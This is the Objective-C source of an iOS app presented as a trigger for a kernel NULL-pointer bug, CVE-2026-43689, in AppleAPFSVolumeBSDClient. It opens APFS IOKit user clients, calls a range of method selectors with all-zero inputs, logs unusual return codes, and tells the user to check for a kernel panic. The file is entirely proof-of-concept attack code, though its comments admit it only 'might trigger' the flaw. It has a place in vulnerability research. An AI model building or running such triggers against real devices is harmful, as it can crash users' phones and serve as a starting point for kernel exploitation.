#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <sys/utsname.h>

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@property (strong, nonatomic) UITextView *logView;
- (void)log:(NSString *)msg;
@end

@implementation AppDelegate

- (void)log:(NSString *)msg {
    NSString *line = [NSString stringWithFormat:@"%@\n", msg];
    NSLog(@"%@", line);
    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text stringByAppendingString:line];
        NSRange range = NSMakeRange(self.logView.text.length - 1, 1);
        [self.logView scrollRangeToVisible:range];
    });
}

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    
    UIViewController *vc = [[UIViewController alloc] init];
    self.logView = [[UITextView alloc] initWithFrame:self.window.bounds];
    self.logView.editable = NO;
    self.logView.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
    self.logView.backgroundColor = [UIColor blackColor];
    self.logView.textColor = [UIColor greenColor];
    vc.view = self.logView;
    
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    
    [self log:@"=== CVE-2026-43689 Trigger ==="];
    [self log:@"Target: AppleAPFSVolumeBSDClient"];
    [self log:@"Bug: Missing NULL pointer check"];
    
    struct utsname uts;
    uname(&uts);
    [self log:[NSString stringWithFormat:@"Device: %s | iOS: %@", uts.machine, [[UIDevice currentDevice] systemVersion]]];
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        [self triggerCVE202643689];
    });
    
    return YES;
}

- (void)triggerCVE202643689 {
    [self log:@"\n[1] Searching for APFS volume services..."];
    
    // Find APFS-related services
    io_iterator_t iterator;
    kern_return_t kr = IOServiceGetMatchingServices(0, IOServiceMatching("AppleAPFSVolume"), &iterator);
    if (kr != KERN_SUCCESS) {
        [self log:@"FAIL: No AppleAPFSVolume services found"];
        return;
    }
    
    io_service_t service;
    int count = 0;
    while ((service = IOIteratorNext(iterator)) != 0) {
        count++;
        [self log:[NSString stringWithFormat:@"[2] Found APFS service #%d: 0x%x", count, service]];
        
        // Try to open user client
        io_connect_t conn = 0;
        kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
        if (kr == KERN_SUCCESS) {
            [self log:[NSString stringWithFormat:@"[3] Opened connection: 0x%x", conn]];
            
            // Try various selectors that might trigger the vulnerable path
            for (int selector = 0; selector < 20; selector++) {
                uint64_t input[10] = {0};
                uint64_t output[10] = {0};
                uint32_t outputCnt = 10;
                
                // Fill input with potentially problematic values
                for (int i = 0; i < 10; i++) {
                    input[i] = 0;  // NULL values to trigger missing check
                }
                
                kr = IOConnectCallMethod(conn, selector, input, 10, NULL, 0, output, &outputCnt, NULL, NULL);
                
                if (kr != KERN_SUCCESS && kr != 0xe00002c2) {
                    [self log:[NSString stringWithFormat:@"[4] Selector %d: 0x%x (interesting!)", selector, kr]];
                }
            }
            
            IOServiceClose(conn);
        } else {
            [self log:[NSString stringWithFormat:@"[3] Failed to open: 0x%x", kr]];
        }
        
        IOObjectRelease(service);
        
        if (count >= 5) break;  // Limit to 5 services
    }
    
    IOObjectRelease(iterator);
    
    // Also try AppleAPFSVolumeBSDClient directly
    [self log:@"\n[5] Trying AppleAPFSVolumeBSDClient..."];
    io_service_t bsdClient = IOServiceGetMatchingService(0, IOServiceMatching("AppleAPFSVolumeBSDClient"));
    if (bsdClient) {
        [self log:[NSString stringWithFormat:@"Found BSD client: 0x%x", bsdClient]];
        
        io_connect_t conn = 0;
        kr = IOServiceOpen(bsdClient, mach_task_self(), 0, &conn);
        if (kr == KERN_SUCCESS) {
            [self log:[NSString stringWithFormat:@"Opened BSD client: 0x%x", conn]];
            
            // Trigger vulnerable method with NULL parameters
            for (int selector = 0; selector < 30; selector++) {
                uint64_t input[10] = {0};
                uint64_t output[10] = {0};
                uint32_t outputCnt = 10;
                
                kr = IOConnectCallMethod(conn, selector, input, 10, NULL, 0, output, &outputCnt, NULL, NULL);
                
                if (kr != KERN_SUCCESS && kr != 0xe00002c2) {
                    [self log:[NSString stringWithFormat:@"BSD Selector %d: 0x%x", selector, kr]];
                }
            }
            
            IOServiceClose(conn);
        }
        IOObjectRelease(bsdClient);
    } else {
        [self log:@"AppleAPFSVolumeBSDClient not found"];
    }
    
    [self log:@"\n=== Trigger Complete ==="];
    [self log:@"Check for kernel panic or unexpected behavior"];
}

@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
